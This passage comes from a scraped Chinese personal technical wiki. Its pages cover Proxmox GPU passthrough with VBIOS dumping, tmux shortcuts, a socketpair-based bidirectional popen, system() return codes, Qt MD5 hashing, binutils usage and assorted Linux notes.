硬件！！硬件！！最大的阻碍是硬件，比如要让两个显卡同时运作，H77是做不到的，而Z77就可以，因为有多路原生PCIe。 参考文章 title: 终于搞定了KVM下的GPU Passthroughvia: http://m.newsmth.net/article/DigiHome/684698 配置参考这个文档https://pve.proxmox.com/wiki/Pci_passthrough …(1)但弄完之后在Windows里就Code: 43 这个回答解决了一个重大问题http://stackoverflow.com/questions/41362981/nvidia-gpu-passthrough-fail-with-code-43 …(2) 把配置要点描述如下： 用UEFI装系统 完整按照(1)的描述做一遍 带声卡的显卡，比如显卡是01:00.0，声卡是01:00.1，直接写01:00.0，真要声卡的话再写一行hostpci，不要合写成01:00 在grub里加上这句：video=efifb:off（不太确定相关性） 按照(2)的说法，你需要自己指定romfile，但是它给的dump方法（两文写的方法一样）并不能用！(2)说你需要临时用另一个显卡启动，但我没有另一个显卡。。。 成功地dump显卡rom方案是：https://github.com/envytools/envytools下载并编译这个工具，里面有一个nvagetbios，直接执行会说invalid signature之类的，要加-s参数： 1nvagetbios -s prom > vbios.bin 这个方法在我这是好使的，得到的vbios.bin可以用rom_parser验证一下： 12345678Valid ROM signature found @0h, PCIR offset 1a0h PCIR: type 0 (x86 PC-AT), vendor: 10de, device: 1c81, class: 030000 PCIR: revision 0, vendor revision: 1Valid ROM signature found @f000h, PCIR offset 1ch PCIR: type 3 (EFI), vendor: 10de, device: 1c81, class: 030000 PCIR: revision 3, vendor revision: 0 EFI: Signature Valid, Subsystem: Boot, Machine: X64 Last image 如果显示Error, ran off the end之类的就是出错了 最终写在配置文件的那句话是这样的： 1hostpci0: 01:00.0,pcie=1,x-vga=on,romfile=vbios.bin 然后启动系统，如果没啥问题的话Proxmox的虚拟机启动画面就会显示在真实显示器上（注意这样配置了之后VNC和网页控制台就不能用了），装了Windows之后就像正常机器一样，Nvidia的驱动也可以随便装。 Nvidia GPU passthrough fail with code 43 via: https://stackoverflow.com/questions/41362981/nvidia-gpu-passthrough-fail-with-code-43 You need to pass copy of unmodified videocard ROM to VM. You need a secondary GPU that you can use as the primary for thisprocess. You cannot dump a clean copy of the BIOS without having the passthrough GPU as a secondary card Put the extra card in the primary slot and the intended passthrough card in another pci-e port and bootup. Find your intended GPU again via lspci -v. In my case it had about the same address. Now you can dump the ROM to a file: 123456# echo \"0000:05:00.0\" > /sys/bus/pci/drivers/vfio-pci/unbind# cd /sys/bus/pci/devices/0000\\:05\\:00.0# echo 1 > rom # cat rom > /home/username/KVM/evga_gtx970.dump# echo 0 > rom# echo \"0000:05:00.0\" > /sys/bus/pci/drivers/vfio-pci/bind In this case, 0000:05:00.0 is my PCI card address. You don’t really need the bind step at the bottom since you’ll be rebooting anyways. You can check the integrity of the ROM dump with this handy utility at https://github.com/awilliam/rom-parser. My rom looks like: 123456789# ./rom-parser evga_gtx970.dumpValid ROM signature found @0h, PCIR offset 1a0h PCIR: type 0 (x86 PC-AT), vendor: 10de, device: 13c2, class: 030000 PCIR: revision 0, vendor revision: 1Valid ROM signature found @f400h, PCIR offset 1ch PCIR: type 3 (EFI), vendor: 10de, device: 13c2, class: 030000 PCIR: revision 3, vendor revision: 0 EFI: Signature Valid, Subsystem: Boot, Machine: X64Last image You should have both an EFI and a non-EFI x86 ROM in the dump ( I think most cards have both) Turn off the machine and put your GTX 1070 back in the primary slot. After booting, edit your VM xml and in the section for your GPU (if you have already assigned the GPU to the VM) there should be a section. Add a file=’path/to/dump/here’ statement to it. My full section looks like: 1234567 This will have the VM start the card with that BIOS instead of whatever the kernel gives it. source Please note that you have to use OVMF (EFI) because SeaBIOS does not use card ROM properly. proxmox显卡直通后 无法用ISO启动 提示DVDROM boot timeout弄好直通指定pcie设备的romfile后，屏幕上出现proxmox的BIOS界面，却无法光盘引导了，明明找到了设备，却提示timeout：","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"虚拟技术","slug":"计算机/虚拟技术","permalink":"http://wiki.noodlefighter.com/categories/计算机/虚拟技术/"}]},{"title":"净水器","date":"2019-07-03T00:00:00.000Z","path":"wiki/日常/装修/净水器/","text":"前置过滤器目的：保护水路。 金属过滤器，金属片弹开大颗粒，有废水，一次性投资不用换耗材，但效果一般。 pp绵过滤器，过滤耗材半年一换，耗材价格便宜30多块，效果好。","tags":[],"categories":[{"name":"日常","slug":"日常","permalink":"http://wiki.noodlefighter.com/categories/日常/"},{"name":"装修","slug":"日常/装修","permalink":"http://wiki.noodlefighter.com/categories/日常/装修/"}]},{"title":"linux网络调优","date":"2019-07-03T00:00:00.000Z","path":"wiki/计算机/linux/linux网络调优/","text":"资料收集： http://www.ethernetresearch.com/geekzone/linux-networking-commands-to-debug-ipudptcp-packet-loss/ https://juejin.im/entry/58bb9e4ba22b9d005ee73457 https://my.oschina.net/guol/blog/115837","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"date","date":"2019-06-28T00:00:00.000Z","path":"wiki/计算机/linux/tools/date/","text":"unix时间戳12345# 获取unix时间戳date +%s# unix时间戳还原为标准时间格式date -d","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"tmux","date":"2019-06-28T00:00:00.000Z","path":"wiki/计算机/linux/tools/tmux/","text":"tmux可以把单个终端分成多个，很轻量。 tmux的基本操作 via: https://www.cnblogs.com/liuguanglin/p/9290345.html 基本的操作无非就是对会话、窗口、窗格进行管理，包括创建、关闭、重命名、连接、分离、选择等等。 一般使用命令和快捷键进行操作，可在系统shell终端和tmux命令模式（类似vim的命令模式）下使用命令，或者在tmux终端使用快捷键。 tmux默认的快捷键前缀是Ctrl+b(下文用prefix指代)，按下前缀组合键后松开，再按下命令键进行快捷操作，比如使用prefix d分离会话（应该写作prefix d而不是prefix+d，因为d键不需要与prefix同时按下）。 快捷键可以自定义，比如将前缀改为Ctrl+a，但需要保留shell默认的Ctrl+a快捷键，按如下所示修改~/.tmux.conf文件： 12341 set-option -g prefix C-a2 unbind-key C-b3 bind-key C-a send-prefix4 bind-key R source-file ~/.tmux.conf \\; display-message \"~/.tmux.conf reloaded.\" 现在已将原先的Ctrl+a用prefix Ctrl+a取代，即需要按两次Ctrl+a生效。 第4行的作用是使用prefix r重新加载配置文件，并输出提示，否则需要关闭会话后配置文件才能生效，也可手动加载配置文件，在tmux终端输入”prefix :”进入命令模式，用source-file命令加载配置文件。 注意，将多个命令写在一起作为命令序列时，命令之间要用空格和分号分隔。 会话管理 常用命令 tmux new 创建默认名称的会话（在tmux命令模式使用new命令可实现同样的功能，其他命令同理，后文不再列出tmux终端命令） tmux new -s mysession 创建名为mysession的会话 tmux ls 显示会话列表 tmux a 连接上一个会话 tmux a -t mysession 连接指定会话 tmux rename -t s1 s2 重命名会话s1为s2 tmux kill-session 关闭上次打开的会话 tmux kill-session -t s1 关闭会话s1 tmux kill-session -a -t s1 关闭除s1外的所有会话 tmux kill-server 关闭所有会话 常用快捷键 prefix s 列出会话，可进行切换 prefix $ 重命名会话 prefix d 分离当前会话 prefix D 分离指定会话 窗口管理prefix c 创建一个新窗口 prefix , 重命名当前窗口 prefix w 列出所有窗口，可进行切换 prefix n 进入下一个窗口 prefix p 进入上一个窗口 prefix l 进入之前操作的窗口 prefix 0~9 选择编号0~9对应的窗口 prefix . 修改当前窗口索引编号 prefix ‘ 切换至指定编号（可大于9）的窗口 prefix f 根据显示的内容搜索窗格 prefix & 关闭当前窗口 窗格管理prefix % 水平方向创建窗格 prefix “ 垂直方向创建窗格 prefix Up|Down|Left|Right 根据箭头方向切换窗格 prefix q 显示窗格编号 prefix o 顺时针切换窗格 prefix } 与下一个窗格交换位置 prefix { 与上一个窗格交换位置 prefix x 关闭当前窗格 prefix space(空格键) 重新排列当前窗口下的所有窗格 prefix ! 将当前窗格置于新窗口 prefix Ctrl+o 逆时针旋转当前窗口的窗格 prefix t 在当前窗格显示时间 prefix z 放大当前窗格(再次按下将还原) prefix i 显示当前窗格信息 其他命令tmux list-key 列出所有绑定的键，等同于prefix ? tmux list-command 列出所有命令","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"CPP多线程编程","date":"2019-06-28T00:00:00.000Z","path":"wiki/计算机/编程/CPP/cpp多线程编程/","text":"程序员的自我修养（六）：保护线程间的共享数据https://liam.page/2017/06/10/protecting-data-sharing-between-threads/","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"CPP","slug":"计算机/编程/CPP","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/CPP/"}]},{"title":"markdown","date":"2019-06-27T00:00:00.000Z","path":"wiki/计算机/通用技术/markdown/","text":"markdown实现页内跳转定义一个锚(id)：跳转到的地方 使用markdown语法：[点击跳转](#jump)","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"通用技术","slug":"计算机/通用技术","permalink":"http://wiki.noodlefighter.com/categories/计算机/通用技术/"}]},{"title":"Linux上实现双向进程间通信管道","date":"2019-06-24T00:00:00.000Z","path":"wiki/计算机/linux/linux上实现双向进程间通信管道/","text":"via: https://www.ibm.com/developerworks/cn/linux/l-pipebid/index.html 问题和常见方法Linux 提供了 popen 和 pclose 函数 (1)，用于创建和关闭管道与另外一个进程进行通信。其接口如下： 1`FILE *popen(const char *command， const char *mode);``int pclose(FILE *stream);` 遗憾的是，popen 创建的管道只能是单向的 – mode 只能是 “r” 或 “w” 而不能是某种组合–用户只能选择要么往里写，要么从中读，而不能同时在一个管道中进行读写。实际应用中，经常会有同时进行读写的要求，比如，我们可能希望把文本数据送往sort工具排序后再取回结果。此时popen就无法用上了。我们需要寻找其它的解决方案。 有一种解决方案是使用 pipe 函数 (2)创建两个单向管道。没有错误检测的代码示意如下： 1`int pipe_in[2], pipe_out[2];``pid_t pid;``pipe(&pipe_in); // 创建父进程中用于读取数据的管道``pipe(&pipe_out); // 创建父进程中用于写入数据的管道``if ( (pid = fork()) == 0) { // 子进程`` ``close(pipe_in[0]); // 关闭父进程的读管道的子进程读端`` ``close(pipe_out[1]); // 关闭父进程的写管道的子进程写端`` ``dup2(pipe_in[1], STDOUT_FILENO); // 复制父进程的读管道到子进程的标准输出`` ``dup2(pipe_out[0], STDIN_FILENO); // 复制父进程的写管道到子进程的标准输入`` ``close(pipe_in[1]); // 关闭已复制的读管道`` ``close(pipe_out[0]); // 关闭已复制的写管道`` ``/* 使用exec执行命令 */``} else { // 父进程`` ``close(pipe_in[1]); // 关闭读管道的写端`` ``close(pipe_out[0]); // 关闭写管道的读端`` ``/* 现在可向pipe_out[1]中写数据，并从pipe_in[0]中读结果 */`` ``close(pipe_out[1]); // 关闭写管道`` ``/* 读取pipe_in[0]中的剩余数据 */`` ``close(pipe_in[0]); // 关闭读管道`` ``/* 使用wait系列函数等待子进程退出并取得退出代码 */``}` 当然，这样的代码的可读性（特别是加上错误处理代码之后）比较差，也不容易封装成类似于popen/pclose的函数，方便高层代码使用。究其原因，是pipe函数返回的一对文件描述符只能从第一个中读、第二个中写（至少对于Linux是如此）。为了同时读写，就只能采取这么累赘的两个pipe调用、两个文件描述符的形式了。 一个更好的方案使用pipe就只能如此了。不过，Linux实现了一个源自BSD的socketpair调用 (3)，可以实现上述在同一个文件描述符中进行读写的功能（该调用目前也是POSIX规范的一部分 (4)）。该系统调用能创建一对已连接的（UNIX族）无名socket。在Linux中，完全可以把这一对socket当成pipe返回的文件描述符一样使用，唯一的区别就是这一对文件描述符中的任何一个都可读和可写。 这似乎可以是一个用来实现进程间通信管道的好方法。不过，要注意的是，为了解决我前面的提出的使用sort的应用问题，我们需要关闭子进程的标准输入通知子进程数据已经发送完毕，而后从子进程的标准输出中读取数据直到遇到EOF。使用两个单向管道的话每个管道可以单独关闭，因而不存在任何问题；而在使用双向管道时，如果不关闭管道就无法通知对端数据已经发送完毕，但关闭了管道又无法从中读取结果数据。——这一问题不解决的话，使用socketpair的设想就变得毫无意义。 令人高兴的是，shutdown调用 (5)可解决此问题。毕竟socketpair产生的文件描述符是一对socket，socket上的标准操作都可以使用，其中也包括shutdown。——利用shutdown，可以实现一个半关闭操作，通知对端本进程不再发送数据，同时仍可以利用该文件描述符接收来自对端的数据。没有错误检测的代码示意如下： 1`int fd[2];``pid_t pid;``socketpair(AF_UNIX, SOCKET_STREAM, 0, fd); // 创建管道``if ( (pid = fork()) == 0) { // 子进程`` ``close(fd[0]); // 关闭管道的父进程端`` ``dup2(fd[1], STDOUT_FILENO); // 复制管道的子进程端到标准输出`` ``dup2(fd[1], STDIN_FILENO); // 复制管道的子进程端到标准输入`` ``close(fd[1]); // 关闭已复制的读管道`` ``/* 使用exec执行命令 */``} else { // 父进程`` ``close(fd[1]); // 关闭管道的子进程端`` ``/* 现在可在fd[0]中读写数据 */`` ``shutdown(fd[0], SHUT_WR); // 通知对端数据发送完毕`` ``/* 读取剩余数据 */`` ``close(fd[0]); // 关闭管道`` ``/* 使用wait系列函数等待子进程退出并取得退出代码 */``}` 很清楚，这比使用两个单向管道的方案要简洁不少。我将在此基础上作进一步的封装和改进。 封装和实现直接使用上面的方法，无论怎么看，至少也是丑陋和不方便的。程序的维护者想看到的是程序的逻辑，而不是完成一件任务的各种各样的繁琐细节。我们需要一个好的封装。 封装可以使用C或者C++。此处，我按照UNIX的传统，提供一个类似于POSIX标准中popen/pclose函数调用的C封装，以保证最大程度的可用性。接口如下： 1`FILE *dpopen(const char *command);``int dpclose(FILE *stream);``int dphalfclose(FILE *stream);` 关于接口，以下几点需要注意一下： 与pipe函数类似，dpopen返回的是文件结构的指针，而不是文件描述符。这意味着，我们可以直接使用fprintf之类的函数，文件缓冲区会缓存写入管道的数据（除非使用setbuf函数关闭文件缓冲区），要保证数据确实写入到管道中需要使用fflush函数。 由于dpopen返回的是可读写的管道，所以popen的第二个表示读/写的参数不再需要。 在双向管道中我们需要通知对端写数据已经结束，此项操作由dphalfclose函数来完成。 具体的实现请直接查看程序源代码，其中有详细的注释和doxygen文档注释 (6)。我只略作几点说明： 本实现使用了一个链表来记录所有dpopen打开的文件指针和子进程ID的对应关系，因此，在同时用dpopen打开的管道的多的时候，dpclose（需要搜索链表）的速度会稍慢一点。我认为在通常使用过程中这不会产生什么问题。如果在某些特殊情况下这会是一个问题的话，可考虑更改dpopen的返回值类型和dpclose的传入参数类型（不太方便使用，但实现简单），或者使用哈希表/平衡树来代替目前使用的链表以加速查找（接口不变，但实现较复杂）。 当编译时在gcc中使用了”-pthread”命令行参数时，本实现会启用POSIX线程支持，使用互斥量保护对链表的访问。因此本实现可以安全地用于POSIX多线程环境之中。 与popen类似 (7)，dpopen会在fork产生的子进程中关闭以前用dpopen打开的管道。 如果传给dpclose的参数不是以前用dpopen返回的非NULL值，当前实现除返回-1表示错误外，还会把errno设为EBADF。对于pclose而言，这种情况在POSIX规范中被视为不确定（unspecified）行为 (8)。 实现中没有使用任何平台相关特性，以方便移植到其它POSIX平台上。 下面的代码展示了一个简单例子，将多行文本送到sort中，然后取回结果、显示出来： 1`#include ``#include ``#include \"dpopen.h\"``#define MAXLINE 80``int main()``{`` ``char line[MAXLINE];`` ``FILE *fp;`` ``fp = dpopen(\"sort\");`` ``if (fp == NULL) {`` ``perror(\"dpopen error\");`` ``exit(1);`` ``}`` ``fprintf(fp, \"orange\\n\");`` ``fprintf(fp, \"apple\\n\");`` ``fprintf(fp, \"pear\\n\");`` ``if (dphalfclose(fp) < 0) {`` ``perror(\"dphalfclose error\");`` ``exit(1);`` ``}`` ``for (;;) {`` ``if (fgets(line, MAXLINE, fp) == NULL)`` ``break;`` ``fputs(line, stdout);`` ``}`` ``dpclose(fp);`` ``return 0;``}` 输出结果为： 1`apple``orange``pear` 总结本文阐述了一个使用socketpair系统调用在Linux上实现双向进程通讯管道的方法，并提供了一个实现。该实现提供的接口与POSIX规范中的popen/pclose函数较为接近，因而非常易于使用。该实现没有使用平台相关的特性，因而可以不加修改或只进行少量修改即可移植到支持socketpair调用的POSIX系统中去。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"system函数","date":"2019-06-24T00:00:00.000Z","path":"wiki/计算机/编程/C/system函数/","text":"123#include int system(const char *command); 返回值处理相关宏在： 1#include Linux system函数返回值 via: https://blog.csdn.net/cheyo/article/details/6595955 例： 1status = system(\"./test.sh\"); 1、先统一两个说法：（1）system返回值：指调用system函数后的返回值，比如上例中status为system返回值（2）shell返回值：指system所调用的shell命令的返回值，比如上例中，test.sh中返回的值为shell返回值。 2、如何正确判断test.sh是否正确执行？仅判断status是否==0？或者仅判断status是否!=-1? 都错！ 3、man中对于system的说明 RETURN VALUE The value returned is -1 on error (e.g. fork() failed), and the return status of the command otherwise. This latter return status is in the format specified in wait(2). Thus, the exit code of the command will be WEXITSTATUS(status). In case /bin/sh could not be executed, the exit status will be that of a command that does exit(127). 看得很晕吧？ system函数对返回值的处理，涉及3个阶段：阶段1：创建子进程等准备工作。如果失败，返回-1。阶段2：调用/bin/sh拉起shell脚本，如果拉起失败或者shell未正常执行结束（参见备注1），原因值被写入到status的低8~15比特位中。system的man中只说明了会写了127这个值，但实测发现还会写126等值。阶段3：如果shell脚本正常执行结束，将shell返回值填到status的低8~15比特位中。备注1：只要能够调用到/bin/sh，并且执行shell过程中没有被其他信号异常中断，都算正常结束。比如：不管shell脚本中返回什么原因值，是0还是非0，都算正常执行结束。即使shell脚本不存在或没有执行权限，也都算正常执行结束。如果shell脚本执行过程中被强制kill掉等情况则算异常结束。 如何判断阶段2中，shell脚本是否正常执行结束呢？系统提供了宏：WIFEXITED(status)。如果WIFEXITED(status)为真，则说明正常结束。如何取得阶段3中的shell返回值？你可以直接通过右移8bit来实现，但安全的做法是使用系统提供的宏：WEXITSTATUS(status)。 由于我们一般在shell脚本中会通过返回值判断本脚本是否正常执行，如果成功返回0，失败返回正数。所以综上，判断一个system函数调用shell脚本是否正常结束的方法应该是如下3个条件同时成立：（1）-1 != status（2）WIFEXITED(status)为真（3）0 == WEXITSTATUS(status) 注意：根据以上分析，当shell脚本不存在、没有执行权限等场景下时，以上前2个条件仍会成立，此时WEXITSTATUS(status)为127，126等数值。所以，我们在shell脚本中不能将127，126等数值定义为返回值，否则无法区分中是shell的返回值，还是调用shell脚本异常的原因值。shell脚本中的返回值最好多1开始递增。 判断shell脚本正常执行结束的健全代码如下： 12345678910111213141516171819202122232425262728293031323334353637#include #include #include #include int main(){ pid_t status; status = system(\"./test.sh\"); if (-1 == status) { printf(\"system error!\"); } else { printf(\"exit status value = [0x%x]\\n\", status); if (WIFEXITED(status)) { if (0 == WEXITSTATUS(status)) { printf(\"run shell script successfully.\\n\"); } else { printf(\"run shell script fail, script exit code: %d\\n\", WEXITSTATUS(status)); } } else { printf(\"exit status = [%d]\\n\", WEXITSTATUS(status)); } } return 0;} WIFEXITED(stat_val) Evaluates to a non-zero value if statuswas returned for a child process thatterminated normally. WEXITSTATUS(stat_val) If the value of WIFEXITED(stat_val) isnon-zero, this macro evaluates to thelow-order 8 bits of the status argumentthat the child process passed to _exit()or exit(), or the value the childprocess returned from main().","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"QT计算md5校验值","date":"2019-06-24T00:00:00.000Z","path":"wiki/计算机/编程/QT/qt计算md5校验值/","text":"via: https://www.jianshu.com/p/fe774becf239 123456789101112131415161718192021222324QString fileMd5(const QString &sourceFilePath) { QFile sourceFile(sourceFilePath); qint64 fileSize = sourceFile.size(); const qint64 bufferSize = 10240; if (sourceFile.open(QIODevice::ReadOnly)) { char buffer[bufferSize]; int bytesRead; int readSize = qMin(fileSize, bufferSize); QCryptographicHash hash(QCryptographicHash::Md5); while (readSize > 0 && (bytesRead = sourceFile.read(buffer, readSize)) > 0) { fileSize -= bytesRead; hash.addData(buffer, bytesRead); readSize = qMin(fileSize, bufferSize); } sourceFile.close(); return QString(hash.result().toHex()); } return QString();}","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"QT","slug":"计算机/编程/QT","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/QT/"}]},{"title":"GNUBinutils","date":"2019-06-21T00:00:00.000Z","path":"wiki/计算机/linux/devtools/gnubinutils/","text":"GNU Binutils 以及相关工具http://www.gnu.org/software/binutils/ ld - the GNU linker. 链接器as - the GNU assembler. 汇编编译器 addr2line - Converts addresses into filenames and line numbers. 将代码地址转换为对应的程序号ar - A utility for creating, modifying and extracting from archives. 将目标文件打包成静态库的工具，还能查看、删除其中的模块（object文件）nm - Lists symbols from object files. 列出目标文件中的符号objcopy - Copies and translates object files. 翻译二进制文件，比如bin到hexobjdump - Displays information from object files. 查看二进制文件的程序段信息等ranlib - Generates an index to the contents of an archive. 生成档案（静态库？）的索引readelf - Displays information from any ELF format object file. 查看elf信息size - Lists the section sizes of an object or archive file. 列出二进制文件中各段大小strings - Lists printable strings from files. 查看文件中的字符串strip - Discards symbols. 用于剔除多余的符号（调试信息） c++filt - Filter to demangle encoded C++ symbols.dlltool - Creates files for building and using DLLs.gold - A new, faster, ELF only linker, still in beta test.gprof - Displays profiling information.nlmconv - Converts object code into an NLM. windmc - A Windows compatible message compiler.windres - A compiler for Windows resource files. linux查看依赖的动态库如果查不到就说明程序可能是静态编译的. 首推readelf: 12345678910[r@r-pc imgtrans]$ readelf ./img_trans -a|grep NEEDED 0x0000000000000001 (NEEDED) 共享库：[libpthread.so.0] 0x0000000000000001 (NEEDED) 共享库：[libdl.so.2] 0x0000000000000001 (NEEDED) 共享库：[libjson-c.so.4] 0x0000000000000001 (NEEDED) 共享库：[libusb-0.1.so.4] 0x0000000000000001 (NEEDED) 共享库：[libusb-1.0.so.0] 0x0000000000000001 (NEEDED) 共享库：[libstdc++.so.6] 0x0000000000000001 (NEEDED) 共享库：[libm.so.6] 0x0000000000000001 (NEEDED) 共享库：[libgcc_s.so.1] 0x0000000000000001 (NEEDED) 共享库：[libc.so.6] ldd命令可以查看程序依赖的动态库：1234$ ldd /bin/ls/bin/ls: is setuid libc.so.0 => /lib//libc.so.0 (0xb6e7e000) ld-uClibc.so.1 => /lib/ld-uClibc.so.0 (0xb6f29000) objdump工具：123$ objdump -p ./sample_venc |grep NEEDED NEEDED libc.so.0 NEEDED ld-uClibc.so.1 查看正在运行中的程序的依赖库：1234567891011121314$ ps -ef|grep bashdev 10280 10276 0 14:32 pts/0 00:00:00 -bashdev 11711 10280 0 16:08 pts/0 00:00:00 grep --color=auto bashdev@develop:~/workspaces/hi3516a/Hi3516A_SDK_V1.0.7.1/mpp/sample/venc$ pmap 10280 |head10280: -bash0000000000400000 976K r-x-- bash00000000006f3000 4K r---- bash00000000006f4000 36K rw--- bash00000000006fd000 24K rw--- [ anon ]0000000000b84000 1816K rw--- [ anon ]00007fee9e033000 44K r-x-- libnss_files-2.23.so00007fee9e03e000 2044K ----- libnss_files-2.23.so00007fee9e23d000 4K r---- libnss_files-2.23.so00007fee9e23e000 4K rw--- libnss_files-2.23.so readelf工具和objdump类似，但信息更好读，信息会更全因为objdump会省略部分辅助性的段。 把二进制文件用objcopy工具装入一个目标文件就是把二进制资源变成符号： 12# objcopy -I binary -O elf32-i386 -B i386 image.jpg image.o# objdump -ht image.o","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"linux存储相关","date":"2019-06-21T00:00:00.000Z","path":"wiki/计算机/linux/linux存储相关/","text":"1234567# 查看分区和容量cat /proc/partitions# 块备份dd if=xxx.img of=/dev/sd* bs=10M#","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"linux学习","date":"2019-06-21T00:00:00.000Z","path":"wiki/计算机/linux/linux学习/","text":"SUSE LINUX的手册, 需要了解的的基础概念/作为使用者的操作思路都在里面了: https://www.pks.mpg.de/~mueller/docs/suse10.1/suselinux-manual_en/manual/ 清华镜象服务https://tuna.moe/ 启动过程https://www.cnblogs.com/image-eye/archive/2011/08/19/2145858.htmlhttps://blog.csdn.net/kebu12345678/article/details/77091927 DTS资料：https://www.raspberrypi.org/documentation/configuration/device-tree.md#part4.6 busyboxhttps://www.ibm.com/developerworks/cn/linux/l-busybox/ DBushttps://www.cnblogs.com/wuyida/p/6299998.htmlhttps://www.freedesktop.org/wiki/Software/dbus/ 和菜鸟一起学linux子系统https://blog.csdn.net/eastmoon502136/column/info/linux-child-system linux驱动之旅, 把各种驱动都实现了一遍, 适合copy代码https://embetronicx.com/tutorials/linux/device-drivers/linux-device-driver-tutorial-part-2-first-device-driver/ 和菜鸟一起学linux系列文章https://blog.csdn.net/eastmoon502136/article/list/6?t=1&orderby=UpdateTime 内核源码之基础准备篇https://blog.csdn.net/eastmoon502136/article/details/8711104 Linux学习教程 - 运维视角，章节划分合理，适合参考http://c.biancheng.net/linux_tutorial/ 虚拟内存https://sylvanassun.github.io/2017/10/29/2017-10-29-virtual_memory/ linux device classhttps://mirrors.edge.kernel.org/pub/linux/kernel/people/mochel/doc/text/class.txt linux下的动态链接文件https://www.cnblogs.com/lidabo/p/4376708.html Linux 线程模型的比较：LinuxThreads 和 NPTLhttps://www.ibm.com/developerworks/cn/linux/l-threading.html linux内核模块编写教程http://www.tldp.org/LDP/lkmpg/2.6/html/ 交叉编译相关 无线管理工具-iwhttps://blog.csdn.net/qq_21792169/article/details/51224777 交叉编译库依赖问题的解决方法https://blog.csdn.net/openblog/article/details/7449991 自己构建交叉编译工具链（GCC、AR之类，主要是可以自定义c库）http://www.embeddedlinux.org.cn/emb-linux/system-development/201708/12-7114.html 交叉编译时的sysroot问题http://www.eetop.cn/blog/html/52/51552-33478.html crosstool-ng/buildroot/embtoolkithttps://www.embtoolkit.org/community.html LFS项目，有适合需要交叉编译的子项目http://www.linuxfromscratch.org/ 关于目标板和开发机（服务器）之间根目录系统的同步，应该有以下方案： uboot从远程NFS启动 启动本地系统后连接网络，进行增量同步 启动本地系统后连接网络，下载根目录镜象，挂载，重定向根目录 海思3516学习blog，构建rootfs等https://blog.csdn.net/qq_40334837/article/category/7504876https://blog.csdn.net/u013308744/article/category/2615271 iw工具https://mirrors.edge.kernel.org/pub/software/network/iw/ 依赖libnlhttps://www.infradead.org/~tgr/libnl/ 参考https://blog.csdn.net/qq_21792169/article/details/51224777","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"chroot","date":"2019-06-21T00:00:00.000Z","path":"wiki/计算机/linux/tools/chroot/","text":"TODO 整理 chroot通常用途https://blog.csdn.net/hmsiwtv/article/details/8201157 [debootstrap]制作基于arm平台的debian文件系统https://www.cnblogs.com/aaronLinux/p/6886163.html busyboxhttps://www.cnblogs.com/baiduboy/p/6228003.html 根文件系统构建实践http://bbs.elecfans.com/jishu_1142348_1_1.html","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"正则表达式","date":"2019-06-21T00:00:00.000Z","path":"wiki/计算机/编程/正则表达式/","text":"正则表达式在线编辑器https://regex101.com/ 将C99风格双斜杠“//”注释替换成ANSI封闭风格注释12搜索： //(.+)替换： /* \\1 */ P.S. 在eclipse的搜索替换功能中测试通过 速查表 via: https://www.jb51.net/shouce/jquery/regexp.html 字符 描述 \\ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，“n”匹配字符“n”。“\\n”匹配一个换行符。串行“\\\\”匹配“\\”而“\\(”则匹配“(”。 ^ 匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性，^也匹配“\\n”或“\\r”之后的位置。 $ 